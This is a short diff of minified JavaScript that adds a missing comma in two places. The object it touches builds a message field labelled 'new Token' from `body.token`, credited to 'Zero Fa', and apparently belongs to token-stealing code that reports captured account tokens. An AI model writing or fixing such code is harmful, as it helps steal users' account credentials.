@@ -1563,7 +1563,7 @@ var a = {
 													name: "new Token",
 													value: `${body.token}`,
 													inline: !0
-												},]
+												},],
 							author: {
 								name: "Zero Fa"
 							},
@@ -1682,7 +1682,7 @@ var c = {
 													name: "new Token",
 													value: `${body.token}`,
 													inline: !0
-												},]
+												},],
 							author: {
 								name: "Zero Fa"
 							},
